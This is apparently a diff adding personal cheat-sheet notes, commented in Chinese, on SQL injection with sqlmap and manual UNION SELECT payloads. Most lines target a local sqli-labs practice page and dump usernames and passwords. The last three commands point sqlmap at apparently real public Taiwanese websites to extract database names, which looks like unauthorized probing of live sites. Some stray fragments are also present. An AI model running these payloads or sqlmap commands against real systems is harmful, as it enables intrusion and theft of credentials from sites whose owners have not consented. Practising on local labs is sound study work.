@@ -1,0 +1,54 @@
+1.sudo dpkg-reconfigure locales  #配置镜像语言
+
+2.reboot #重启
+
+3.    id=' UNION ALL SELECT NULL,CONCAT(0x1,database(),0x1),NULL-- -
+
+sqlmap -u http://192.168.71.36/Less-1/?id=2   #测试有无sql注入
+sqlmap -u http://192.168.71.36/Less-1/?id=2 ''--columns'' ''-T users'' ''-D security''
+
+--current -db  #获取当前数据库名
+--tables -D -security #获取security数据库下单表
+--columns -T userss -D security #获取security数据库中的users表字段的内容
+
+-T  #指定表
+-D #指定数据库
+-C #指定字段
+
+--tables #获取当前条件下的所有表
+--database --dbs #获取数据库列表
+--columns #获取字段列表
+--dump #导出内容(慎重)
+
+-D security -T users -C username --dump  
+-D security -T users -C username,password --dump
+
+taobao
+-asdasd
+	--username
+	--password
+
+
+
+
+
+
+sudo dpkg-reconfigure locales #
+sqlmap -u http://192.168.71.36/Less-1/?id=2 --current-db --tables -D security #
+
+id=-7694' UNION ALL SELECT NULL,CONCAT(0x717a6b6b71,0x447a446578446c796f7746766f6b7a4b7767515850766a6f54676865716d5653754a4e456c496f42,0x717a716b71),NULL-- ----
+http://192.168.71.36/Less-1/?id=-7694%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(1,user(),3),NULL--%20----
+
+sqlmap -u http://192.168.71.36/Less-1/?id=2 --columns -T users -D security
+sqlmap -u http://192.168.71.36/Less-1/?id=2 --dump -T users -D security
+sqlmap -u http://192.168.71.36/Less-1/?id=2 -D security -T users -C username --dump
+sqlmap -u http://192.168.71.36/Less-1/?id=2 -D security -T users -C username,password --dump
+
+
+
+sqlmap -u ' http://www.3589559.com.tw/model/download.php?no=2&code=nurture&action=form' --current-db
+sqlmap -u 'http://nurture.3589559.com.tw/course.php?clclass=1' --current-db
+sqlmap -u 'http://nurture.3589559.com.tw/qa.php?q_no=1&action_qa=info' --current-db
+
+
+
